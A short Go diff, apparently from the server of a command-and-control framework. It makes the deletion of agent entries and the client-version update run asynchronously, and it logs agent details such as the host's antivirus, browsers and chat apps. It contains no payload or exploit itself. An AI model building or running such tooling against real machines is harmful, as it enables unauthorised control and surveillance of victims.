@@ -1539,7 +1539,7 @@ func GetInfo(uid,encry_str,key,clientIP string,code_map map[byte]int){
     log_str1 := fmt.Sprintf(log_word["agent_online"],
     username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:])
     logger.WriteLog(log_str1)
-    DeleteEntry(uid)
+    go DeleteEntry(uid)
 }
 func Windows_GetInfo(uid,encry_str,key,clientIP string,code_map map[byte]int){
     data := Get_decry_s(&encry_str, &key, code_map)
@@ -1590,7 +1590,7 @@ func Windows_GetInfo(uid,encry_str,key,clientIP string,code_map map[byte]int){
         username, uid, shellname, osname, version, executable, t, jitter, clientIP, innet_ip, port, protocol, server_remark, currentDir, hashString[12:], macs, cpuInfo, memoryStr, systemType, arch, antivirus, browsers, chatApps)
     logger.WriteLog(log_str)
     // 删除连接条目
-    DeleteEntry(uid)
+    go DeleteEntry(uid)
 }
 func updateServerClients(port, protocol string, serverChan chan<- string) {
     serverRemark := "unknown"
@@ -2395,15 +2395,17 @@ func Getcmd(uid, cmd, Taskid string) string {
         version := cmd_split[1]
 
         // 更新 client version
-        clientDataMu.Lock()
-        for i := range client_data.Clients {
-            client := &client_data.Clients[i]
-            if uid == client.Uid {
-                client.version = version
-                break
-            }
-        }
-        clientDataMu.Unlock()
+		go func(){
+	        clientDataMu.Lock()
+	        for i := range client_data.Clients {
+	            client := &client_data.Clients[i]
+	            if uid == client.Uid {
+	                client.version = version
+	                break
+	            }
+	        }
+	        clientDataMu.Unlock()
+		}()
 
         finalCmd = cmd + "^" + Taskid
 
